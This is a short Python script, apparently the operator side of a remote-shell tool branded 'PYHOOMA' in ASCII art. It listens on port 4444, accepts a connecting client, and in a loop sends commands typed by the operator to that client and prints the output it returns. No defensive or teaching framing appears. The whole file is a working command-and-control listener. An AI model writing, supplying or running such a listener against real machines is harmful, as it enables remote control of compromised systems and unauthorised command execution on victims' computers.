import sys
import socket
from rgbprint import Color

SERVER = ""
PORT = 4444


w = Color.ghost_white
r = Color.red
y = Color.yellow
g = Color.gray
l = Color.lime

print(f'''{w}
██████  ██    ██ ██   ██  ██████   ██████  ███    ███  █████      
██   ██  ██  ██  ██   ██ ██    ██ ██    ██ ████  ████ ██   ██     
██████    ████   ███████ ██    ██ ██    ██ ██ ████ ██ ███████     
██         ██    ██   ██ ██    ██ ██    ██ ██  ██  ██ ██   ██     
{g}██         ██    ██   ██  ██████   ██████  ██      ██ ██   ██     
''')

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))

s.listen(1)

while True:
    print(f'{w}[{g}*{w}] listening as {l}{SERVER}{w}:{r}{PORT}')

    client = s.accept()
    print(f'{w}[{r}+{w}] client connected {r}: {l} {client[1]}')

    client[0].send('connected'.encode())
    while True:
        cmd = input(f'{l}{SERVER}{w}:{r}{PORT}{g} ${y} ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Wait for new client y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()